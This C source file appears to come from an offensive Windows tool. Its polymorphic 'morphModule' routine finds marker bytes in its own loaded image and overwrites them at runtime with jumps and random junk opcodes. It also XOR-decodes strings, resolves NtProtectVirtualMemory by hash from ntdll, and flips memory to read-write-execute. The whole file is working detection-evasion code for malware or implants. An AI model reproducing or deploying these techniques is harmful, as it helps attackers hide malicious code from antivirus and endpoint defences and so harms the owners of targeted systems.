//
// Created by 0xtriboulet on 4/15/2023.
//

#include "Config.h"
#include "Poly.h"

#if CONFIG_OBFUSCATION

VOID morphModule() {
#if CONFIG_OBFUSCATION

    unsigned char s_xk[] = S_XK;
    unsigned char s_string[] = S_MARKER_MASK;

    char * MARKER_MASK = xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk));

#else
    char * MARKER_MASK = S_MARKER_MASK;
#endif

    // Declare the MODULEINFO struct to store module information.
    MODULEINFO modInfo;

    // Obtain the current process handle.
    HANDLE hProcess = NtCurrentProcess;

    // Get a handle to the base module of the current process.
    HMODULE hModule = GetModuleHandleA(NULL);

    // If the module information is obtained successfully, enter the loop.
    if (GetModuleInformation(hProcess, hModule, &modInfo, sizeof(MODULEINFO)))
    {
        // Check if module size is less than MAXDWORD.
        if (modInfo.SizeOfImage < MAXDWORD)
        {
            // Declare the byte pointer to the last matching pattern and the match offset.
            byte* pbyLastMatch;
            DWORD dwMatchOffset = 0;

            // Set the morphing status to not finished.
            BOOL bMorphingFinished = FALSE;

            // Declare a counter for the number of memory regions that have been morphed.
            DWORD dwRegionCount = 0;

            // Iterate through memory regions of the current process's module to search for the marker pattern.
            while (!bMorphingFinished)
            {
                // Call the findPattern function to search for the marker pattern in memory.
                pbyLastMatch = findPattern((byte*)modInfo.lpBaseOfDll + dwMatchOffset, modInfo.SizeOfImage - dwMatchOffset, (byte*)MARKER_BYTES, MARKER_MASK, MARKER_SIZE);

                // If the marker pattern is found, replace it with random opcodes and update the offsets.
                if (pbyLastMatch != NULL)
                {
                    morphMemory(pbyLastMatch, (BYTE) MARKER_SIZE);
                    dwRegionCount++;

                    pbyLastMatch++;
                    dwMatchOffset = (LPVOID) pbyLastMatch - modInfo.lpBaseOfDll;
                }
                    // If the marker pattern is not found, set the morphing status to finished.
                else
                {
                    bMorphingFinished = TRUE;
                }
            }
        }
    }

    // Clean up the process handle.
    CloseHandle(hProcess);
}


VOID morphMemory(PBYTE pbyDst, BYTE byLength)
{
    /*                  *
    *** JUNK CODE ALGO ***
    jmp        or      0x90
    rdm                jmp
    rdm                rdm
    rdm                rdm
    */

    // Initialize a flag to seed the random number generator
    static BOOL bSetSeed = TRUE;
    if (bSetSeed)
    {
        srand((UINT)time(NULL));
        bSetSeed = FALSE;
    }

    // Allocate memory for the opcodes to be morphed
    PBYTE morphedOpcodes = (PBYTE)malloc(byLength * sizeof(BYTE));
    BYTE byOpcodeIt = 0;

    // Determine whether to insert a NOP instruction at the beginning of the opcodes
    BOOL bPlaceNop = (rand() % 2) ? TRUE : FALSE;
    if (bPlaceNop)
    {
        morphedOpcodes[byOpcodeIt] = ASM_OPCODE_NOP;
        byOpcodeIt++;
    }

    // Insert a relative JMP instruction at the beginning of the opcodes
    morphedOpcodes[byOpcodeIt] = ASM_OPCODE_JMP_REL;
    byOpcodeIt++;

    // Calculate the length of the JMP instruction and insert it after the JMP instruction
    morphedOpcodes[byOpcodeIt] = byLength - ASM_INSTR_SIZE_JMP_REL - ((bPlaceNop) ? ASM_INSTR_SIZE_NOP : 0);
    byOpcodeIt++;

    // Insert random opcodes after the JMP instruction
    for (; byOpcodeIt < byLength; byOpcodeIt++)
        morphedOpcodes[byOpcodeIt] = rand() % MAXBYTE; // 0xFF

    // Change the protection of the memory to allow execution and write the morphed opcodes to memory
    DWORD dwOldProtect = 0x0;

#if CONFIG_NATIVE
    #if CONFIG_ARCH == x64
    void *p_ntdll = get_ntdll_64();
#else
    void *p_ntdll = get_ntdll_32();
#endif //CONFIG_ARCH
    NTSTATUS status;
    void *p_nt_protect_virtual_memory = get_proc_address_by_hash(p_ntdll, NtProtectVirtualMemory_CRC32B);
    NtProtectVirtualMemory_t g_nt_protect_virtual_memory = (NtProtectVirtualMemory_t) p_nt_protect_virtual_memory;
    size_t pbySize = sizeof(MARKER_BYTES);

    // set permissions
    g_nt_protect_virtual_memory(NtCurrentProcess,&pbyDst,&pbySize,PAGE_EXECUTE_READWRITE,&dwOldProtect);

    // patch marker bytes
    rev_memcpy(pbyDst, morphedOpcodes, byLength);


    // Restore the original memory protection
    g_nt_protect_virtual_memory(NtCurrentProcess,&pbyDst,&pbySize,dwOldProtect,&dwOldProtect);

#else
    VirtualProtect(pbyDst, byLength, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    rev_memcpy(pbyDst, morphedOpcodes, byLength);

    // Restore the original memory protection
    VirtualProtect(pbyDst, byLength, dwOldProtect, &dwOldProtect);
#endif //CONFIG NATIVE

    // Free the memory allocated for the morphed opcodes
    free(morphedOpcodes);
}


PBYTE findPattern(PBYTE pData, SIZE_T uDataSize, PBYTE pPattern, PCHAR pszMask, SIZE_T uPatternSize)
{
    // loop over pData
    for (size_t i = 0; i < uDataSize - uPatternSize; i++) {
        BOOL bFound = TRUE;

        // loop over pPattern
        for (size_t j = 0; j < uPatternSize; j++) {

            // check if the current character in pszMask is 'x'
            // and if the corresponding bytes in pData and pPattern match
            if (pszMask[j] == 'x' && pData[i + j] != pPattern[j]) {
                bFound = FALSE;
                // exit inner loop if bytes do not match
                break;
            }
        }

        // if all bytes match, return pointer to found pattern in pData
        if (bFound) {
            return &pData[i];
        }
    }

    // pattern not found
    return NULL;
}

PVOID rev_memcpy (PBYTE dest, const PBYTE src, size_t n)
{
    // create a pointer to the beginning of the source buffer
    PBYTE s = src;

    // loop while n is not zero
    while (n--)

        // copy byte from src to dest using the s pointer and increment pointers
        *dest++ = *s++;

    // return pointer to the byte following the last byte written to dest
    return dest;
}

#else //CONFIG_POLYMORPHIC

void morphModule()
{
    return;
}
#endif //CONFIG_POLYMORPHIC
